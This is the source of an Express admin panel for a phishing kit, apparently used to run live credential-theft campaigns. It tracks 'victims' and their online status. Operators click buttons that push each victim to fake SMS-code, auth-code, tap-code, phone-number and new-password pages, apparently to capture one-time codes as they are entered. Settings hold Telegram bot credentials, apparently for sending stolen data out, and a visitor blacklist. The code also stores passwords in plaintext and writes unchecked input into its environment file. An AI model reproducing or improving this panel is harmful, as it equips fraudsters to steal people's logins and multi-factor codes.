const express = require('express');
const router = express.Router();
const path = require('path');
const db = require('../lib/db');
const config = require('../lib/config');
const fs = require('fs');

function requireAdmin(req, res, next) {
  if (!req.session.loggedin) {
    return res.redirect('/zynexroot/login.php');
  }
  next();
}

function requireRole(role) {
  return (req, res, next) => {
    if (req.session.role !== role) {
      return res.status(403).send('Forbidden');
    }
    next();
  };
}

router.get('/login.php', (req, res) => {
  const error = req.session.error || null;
  req.session.error = null;
  res.render('admin/login', { error });
});

router.post('/login.php', async (req, res) => {
  const { loginUsername, loginPassword } = req.body;

  if (!loginUsername || !loginPassword) {
    req.session.error = 'Username and password are required.';
    return res.redirect('/zynexroot/login.php');
  }

  if (/['"^*\/]/.test(loginUsername) || /['"^*\/]/.test(loginPassword)) {
    req.session.error = 'Invalid characters in username or password.';
    return res.redirect('/zynexroot/login.php');
  }

  if (loginUsername === config.admin.username && loginPassword === config.admin.password) {
    req.session.loggedin = true;
    req.session.username = loginUsername;
    req.session.role = 'Admin';
    return res.redirect('/zynexroot/index.php');
  }

  try {
    const handlers = await db.query(
      'SELECT username FROM handlers WHERE username = ? AND password = ?',
      [loginUsername, loginPassword]
    );
    if (handlers.length > 0) {
      req.session.loggedin = true;
      req.session.username = loginUsername;
      req.session.role = 'Handler';
      return res.redirect('/zynexroot/index.php');
    }
  } catch (err) {
    console.error('Login query error:', err);
  }

  req.session.error = 'Invalid login credentials. Please try again.';
  res.redirect('/zynexroot/login.php');
});

router.get('/logout.php', (req, res) => {
  req.session.destroy();
  res.redirect('/zynexroot/login.php');
});

router.get('/index.php', requireAdmin, async (req, res) => {
  try {
    const totalVictims = (await db.query('SELECT COUNT(*) as count FROM victims'))[0]?.count || 0;
    const totalVisits = (await db.query('SELECT COUNT(*) as count FROM visits'))[0]?.count || 0;

    let onlineCount = 0;
    const victims = await db.query('SELECT * FROM victims ORDER BY id DESC');
    const now = Math.floor(Date.now() / 1000);
    for (const v of victims) {
      if (parseInt(v.lastseen) > now - 9) onlineCount++;
    }

    const redirectsHtml = `<div class='button-container'>
    <button type='button' class='button error-button' data-id='CHANGE_TO_ID' data-sts='3' title='Login Error'><span>Login Error</span></button>
    <button type='button' class='button error-button' data-id='CHANGE_TO_ID' data-sts='7' title='Password Error'><span>Password Error</span></button>
    <button type='button' class='button fit-text-button' data-id='CHANGE_TO_ID' data-sts='51' data-parm='1' title='PhoneNumber'><span>PhoneNumber</span></button>
    <button type='button' class='button fit-text-button' data-id='CHANGE_TO_ID' data-sts='9' data-parm='1' title='SMS Code'><span>SMS Code</span></button>
    <button type='button' class='button error-button' data-id='CHANGE_TO_ID' data-sts='11' data-parm='1' title='SMSCode Error'><span>SMSCode Error</span></button>
    <button type='button' class='button fit-text-button' data-id='CHANGE_TO_ID' data-sts='17' title='Auth Code'><span>Auth Code</span></button>
    <button type='button' class='button error-button' data-id='CHANGE_TO_ID' data-sts='19' title='AuthCode Error'><span>AuthCode Error</span></button>
    <button type='button' class='button fit-text-button' data-id='CHANGE_TO_ID' data-sts='156' data-parm='1' title='Tap Code'><span>Tap Code</span></button>
    <button type='button' class='button finish-button' data-id='CHANGE_TO_ID' data-sts='0' title='Redirect'><span>Redirect</span></button>
    <button type='button' class='button finish-button' data-id='CHANGE_TO_ID' data-sts='43' title='NewPassword'><span>NewPassword</span></button>
    <button type='button' class='button error-button' data-id='CHANGE_TO_ID' data-sts='45' title='WrongPassword'><span>WrongPassword</span></button>
</div>`;

    const btnsHtml = `<td style='vertical-align:middle;'>
    <div class='input-group-prepend' style='display: flex; gap: 10px;'>
        CHANGE_TO_REDIRECTS
        <button type='button' data-toggle='modal' data-target='#myModal' onclick='show_info("CHANGE_TO_ID");' title='Show Details' style='flex: 1; background-color: #2196F3; color: #fff; border: none; border-radius: 5px; cursor: pointer; transition: background-color 0.3s; padding: 10px; font-size: 16px;'><i class='icon-info'></i></button>
        <button type='button' onclick='save("CHANGE_TO_ID");' title='Download' style='flex: 1; background-color: #4CAF50; color: #fff; border: none; border-radius: 5px; cursor: pointer; transition: background-color 0.3s; padding: 10px; font-size: 16px;'><i class='icon-contract'></i></button>
        <button type='button' onclick='pause_alert("CHANGE_TO_ID");' title='Silent Alert' style='flex: 1; background-color: #ff9800; color: #fff; border: none; border-radius: 5px; cursor: pointer; transition: background-color 0.3s; padding: 10px; font-size: 16px;'><i class='fa fa-bell-slash'></i></button>
        <button type='button' onclick='ban("CHANGE_TO_ID");' title='Ban' style='flex: 1; background-color: #673ab7; color: #fff; border: none; border-radius: 5px; cursor: pointer; transition: background-color 0.3s; padding: 10px; font-size: 16px;'><i class='fa fa-ban'></i></button>
        <button type='button' onclick='remove("CHANGE_TO_ID");' title='Delete' style='flex: 1; background-color: #f44336; color: #fff; border: none; border-radius: 5px; cursor: pointer; transition: background-color 0.3s; padding: 10px; font-size: 16px;'><i class='icon-close'></i></button>
    </div>
</td>`;

    res.render('admin/dashboard', { totalVictims, totalVisits, onlineCount, victims, redirectsHtml, btnsHtml });
  } catch (err) {
    console.error('Dashboard error:', err);
    res.status(500).send('Database error');
  }
});

router.get('/crew.php', requireAdmin, requireRole('Admin'), async (req, res) => {
  try {
    const handlers = await db.query('SELECT * FROM handlers');
    res.render('admin/crew', { handlers });
  } catch (err) {
    res.status(500).send('Database error');
  }
});

router.get('/handlers.php', requireAdmin, requireRole('Admin'), async (req, res) => {
  try {
    const handlers = await db.query('SELECT * FROM handlers');
    res.render('admin/handlers', { handlers });
  } catch (err) {
    res.status(500).send('Database error');
  }
});

router.get('/settings.php', requireAdmin, (req, res) => {
  res.render('admin/settings', { config });
});

router.post('/set.php', requireAdmin, async (req, res) => {
  try {
    const envPath = path.join(__dirname, '..', '.env');
    let envContent = fs.readFileSync(envPath, 'utf8');

    const updates = {
      DB_HOST: req.body.dbhost,
      DB_NAME: req.body.dbname,
      DB_USER: req.body.dbuser,
      DB_PASS: req.body.dbpass,
      ADMIN_USERNAME: req.body.adminuser,
      ADMIN_PASSWORD: req.body.adminpass,
      EXIT_URL: req.body.extlink,
      TELEGRAM_CHAT_ID: req.body.chatid,
      TELEGRAM_BOT_TOKEN: req.body.bottoken,
    };

    for (const [key, value] of Object.entries(updates)) {
      const regex = new RegExp(`^${key}=.*$`, 'm');
      if (regex.test(envContent)) {
        envContent = envContent.replace(regex, `${key}=${value}`);
      } else {
        envContent += `\n${key}=${value}`;
      }
    }

    fs.writeFileSync(envPath, envContent);
    res.redirect('/zynexroot/settings.php?success=1');
  } catch (err) {
    console.error('Settings save error:', err);
    res.redirect('/zynexroot/settings.php?error=1');
  }
});

router.post('/add.php', requireAdmin, requireRole('Admin'), async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.redirect('/zynexroot/crew.php?error=1');

  try {
    await db.query('INSERT INTO handlers (username, password) VALUES (?, ?)', [username, password]);
    res.redirect('/zynexroot/crew.php?success=1');
  } catch (err) {
    res.redirect('/zynexroot/crew.php?error=1');
  }
});

router.get('/reset.php', requireAdmin, async (req, res) => {
  try {
    const blacklistPath = path.join(__dirname, '..', 'public', 'blacklist.dat');
    fs.writeFileSync(blacklistPath, '');
    res.redirect('/zynexroot/settings.php?reset=1');
  } catch (err) {
    res.redirect('/zynexroot/index.php?error=1');
  }
});

router.post('/update_checkbox_state.php', requireAdmin, async (req, res) => {
  res.json({ status: 'ok' });
});

module.exports = router;
